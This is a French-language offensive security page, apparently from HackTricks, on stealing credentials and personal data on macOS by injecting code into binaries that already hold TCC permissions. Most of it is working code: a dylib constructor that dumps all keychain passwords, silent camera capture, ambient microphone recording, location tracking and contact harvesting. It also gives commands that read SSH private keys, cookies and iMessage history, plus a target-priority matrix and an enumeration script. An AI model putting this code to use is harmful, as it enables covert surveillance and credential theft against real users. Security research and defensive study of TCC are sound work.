# macOS Vol d'identifiants & de données via les permissions TCC

{{#include ../../../../banners/hacktricks-training.md}}

## Aperçu

macOS TCC (Transparency, Consent, and Control) protège l'accès aux données utilisateur sensibles. Lorsqu'un attaquant **compromet un binaire qui dispose déjà d'autorisations TCC**, il hérite de ces permissions. Cette page documente le potentiel d'exploitation de chaque permission TCC liée au vol de données.

> [!WARNING]
> L'injection de code dans un binaire bénéficiant de permissions TCC (via DYLD injection, dylib hijacking, or task port) **hérite silencieusement de toutes ses permissions TCC**. Il n'y a aucune invite ou vérification supplémentaire lorsque le même processus lit des données protégées.

---

## Groupes d'accès du Keychain

### Ce qui est en jeu

Le Keychain macOS stocke :
- **Wi-Fi passwords** — tous les mots de passe des réseaux sans fil enregistrés
- **Website passwords** — les mots de passe de sites web — Safari, Chrome (when using Keychain), et autres navigateurs
- **Application passwords** — comptes email, identifiants VPN, tokens de développement
- **Certificates and private keys** — certificats et clés privées — signature de code, client TLS, chiffrement S/MIME
- **Secure notes** — notes sécurisées stockées par l'utilisateur

### Entitlement: `keychain-access-groups`

Les éléments du Keychain sont organisés en **groupes d'accès**. Le droit `keychain-access-groups` d'une application liste les groupes auxquels elle peut accéder :
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Exploitation
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Vol du Keychain
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Camera Access (kTCCServiceCamera)

### Exploitation

Un binaire disposant de l'autorisation TCC pour la caméra (via `kTCCServiceCamera` ou l'entitlement `com.apple.security.device.camera`) peut capturer des photos et des vidéos :
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Silent Capture
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> À partir de **macOS Sonoma**, l'indicateur de la caméra dans la barre de menus est persistant et ne peut pas être masqué par programmation. Sur les **anciennes versions de macOS**, une capture brève peut ne pas produire d'indicateur visible.
>
---

## Accès au microphone (kTCCServiceMicrophone)

### Exploitation

L'accès au microphone capture tous les sons du microphone intégré, du casque, ou des périphériques d'entrée audio connectés :
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Attaque: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## Suivi de localisation (kTCCServiceLocation)

### Exploitation
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### Suivi continu
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Contacts / Calendrier / Photos

### Exfiltration de données personnelles

| TCC Service | Framework | Données |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | Noms, e-mails, téléphones, adresses |
| `kTCCServiceCalendar` | `EventKit` | Réunions, participants, lieux |
| `kTCCServicePhotos` | `Photos.framework` | Photos, captures d'écran, métadonnées de localisation |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Collecte de contacts
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## Accès au compte iCloud

### Autorisation : `com.apple.private.icloud-account-access`

Cette autorisation permet de communiquer avec le service XPC `com.apple.iCloudHelper`, fournissant l'accès à :
- **iCloud tokens** — jetons d'authentification pour l'Apple ID de l'utilisateur
- **iCloud Drive** — documents synchronisés depuis tous les appareils
- **iCloud Keychain** — mots de passe synchronisés sur tous les appareils Apple
- **Find My** — localisation de tous les appareils Apple de l'utilisateur
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> La compromission d'un binaire iCloud-entitled étend l'attaque d'un **seul appareil à l'ensemble de l'écosystème Apple** : autres Macs, iPhones, iPads, Apple Watch. La synchronisation iCloud Keychain permet d'accéder aux mots de passe de tous les appareils.

---

## Full Disk Access (kTCCServiceSystemPolicyAllFiles)

### La permission TCC la plus puissante

Full Disk Access accorde la capacité de lecture sur **tous les fichiers du système**, y compris :
- Les données des autres applications (Messages, Mail, historique Safari)
- Bases de données TCC (révélant toutes les autres autorisations)
- Clés SSH et configuration
- Cookies de navigateur et jetons de session
- Bases de données et caches des applications
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Matrice de priorité d'exploitation

Lors de l'évaluation des binaires injectables accordés par TCC, priorisez selon la valeur des données :

| Priorité | Permission TCC | Pourquoi |
|---|---|---|
| **Critique** | Full Disk Access | Accès à tout |
| **Critique** | TCC Manager | Peut accorder n'importe quelle autorisation |
| **Élevé** | Keychain Access Groups | Tous les mots de passe stockés |
| **Élevé** | iCloud Account Access | Compromission multi-appareils |
| **Élevé** | Input Monitoring (ListenEvent) | Keylogging |
| **Élevé** | Accessibility | Contrôle GUI, auto-autorisation |
| **Moyen** | Screen Capture | Capture visuelle de données |
| **Moyen** | Camera + Microphone | Surveillance |
| **Moyen** | Contacts + Calendar | Données de social engineering |
| **Faible** | Location | Suivi physique |
| **Faible** | Photos | Données personnelles |

## Script d'énumération
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## Références

* [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
* [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
* [Objective-See — TCC Exploitation](https://objectivesee.org/blog/blog_0x4C.html)
* [OBTS v5.0 — iCloud Token Extraction (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)

{{#include ../../../../banners/hacktricks-training.md}}
